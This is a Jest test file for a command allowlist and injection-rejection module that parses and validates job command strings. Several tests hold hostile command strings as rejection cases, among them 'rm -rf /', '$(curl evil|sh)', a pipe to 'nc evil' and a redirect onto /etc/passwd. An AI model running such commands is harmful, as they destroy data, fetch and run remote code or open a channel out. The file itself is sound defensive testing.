import path from 'path'
import {
  parseCommandBody,
  loadAllowlist,
  validateArgv,
  checkCommand,
  _resetAllowlistCache,
  CommandPolicyError
} from '../src/commandPolicy.js'

const FIXTURE = path.join(process.cwd(), 'test/fixtures/allowlist.json')

describe('parseCommandBody', () => {
  test('parses a plain php job command to argv', () => {
    const body = "/usr/bin/php /var/sdapp/suredone/jobs/ebay-products-import.php 689333 1 item 'a*b*c' false jobname 2026-01-01T00:00:00"
    expect(parseCommandBody(body)).toEqual([
      '/usr/bin/php', '/var/sdapp/suredone/jobs/ebay-products-import.php',
      '689333', '1', 'item', 'a*b*c', 'false', 'jobname', '2026-01-01T00:00:00'
    ])
  })

  test('rejects command chaining', () => {
    expect(() => parseCommandBody('/usr/bin/php x.php; rm -rf /')).toThrow(CommandPolicyError)
  })

  test('rejects command substitution', () => {
    expect(() => parseCommandBody('/usr/bin/php x.php $(curl evil|sh)')).toThrow(CommandPolicyError)
    expect(() => parseCommandBody('/usr/bin/php x.php `id`')).toThrow(CommandPolicyError)
  })

  test('rejects pipes, redirects, and unquoted globs', () => {
    expect(() => parseCommandBody('/usr/bin/php x.php | nc evil 1')).toThrow(CommandPolicyError)
    expect(() => parseCommandBody('/usr/bin/php x.php > /etc/passwd')).toThrow(CommandPolicyError)
    expect(() => parseCommandBody('/usr/bin/php *.php')).toThrow(CommandPolicyError)
  })

  test('rejects empty / whitespace-only bodies', () => {
    expect(() => parseCommandBody('')).toThrow(CommandPolicyError)
    expect(() => parseCommandBody('   ')).toThrow(CommandPolicyError)
  })
})

describe('validateArgv', () => {
  const al = loadAllowlist(FIXTURE)

  test('allows a listed php job in the listed dir', () => {
    expect(validateArgv(['/usr/bin/php', '/var/sdapp/suredone/jobs/ebay-products-import.php', '1'], al).ok).toBe(true)
  })
  test('rejects php job in a different dir', () => {
    expect(validateArgv(['/usr/bin/php', '/tmp/evil.php'], al).ok).toBe(false)
  })
  test('rejects an unlisted php script', () => {
    expect(validateArgv(['/usr/bin/php', '/var/sdapp/suredone/jobs/not-real.php'], al).ok).toBe(false)
  })
  test('rejects an unlisted binary', () => {
    expect(validateArgv(['/bin/bash', '-c', 'x'], al).ok).toBe(false)
  })
  test('allows a listed sd subcommand and rejects an unlisted one', () => {
    expect(validateArgv(['/usr/bin/sd', 'LogModel', 'index', 's3://x'], al).ok).toBe(true)
    expect(validateArgv(['/usr/bin/sd', 'EvilModel', 'pwn'], al).ok).toBe(false)
  })
  test('enforces npm fixed prefix then command name', () => {
    expect(validateArgv(['/usr/bin/npm', '--prefix', '/var/sdapp/suredone/ui/server', 'run', 'command', 'processEvent', '1'], al).ok).toBe(true)
    expect(validateArgv(['/usr/bin/npm', '--prefix', '/evil', 'run', 'command', 'processEvent'], al).ok).toBe(false)
    expect(validateArgv(['/usr/bin/npm', '--prefix', '/var/sdapp/suredone/ui/server', 'run', 'command', 'evilCmd'], al).ok).toBe(false)
  })
})

describe('checkCommand', () => {
  beforeEach(() => _resetAllowlistCache())

  test('ok for a valid command (returns argv)', () => {
    const opt = { commandPolicy: 'enforce', commandAllowlistFile: FIXTURE }
    const r = checkCommand("/usr/bin/php /var/sdapp/suredone/jobs/ebay-products-import.php 1 item 'a;b'", opt)
    expect(r.ok).toBe(true)
    expect(r.argv[0]).toBe('/usr/bin/php')
  })
  test('not ok for an injection attempt', () => {
    const opt = { commandPolicy: 'enforce', commandAllowlistFile: FIXTURE }
    expect(checkCommand('/usr/bin/php /var/sdapp/suredone/jobs/ebay-products-import.php; id', opt).ok).toBe(false)
  })
  test('misconfig (fail-open) when allowlist file is missing', () => {
    const opt = { commandPolicy: 'enforce', commandAllowlistFile: '/nonexistent/allowlist.json' }
    const r = checkCommand('/usr/bin/php /var/sdapp/suredone/jobs/ebay-products-import.php 1', opt)
    expect(r.ok).toBe(true)
    expect(r.argv).toBeNull()
    expect(r.misconfig).toMatch(/allowlist|no such file|ENOENT/i)
  })
})
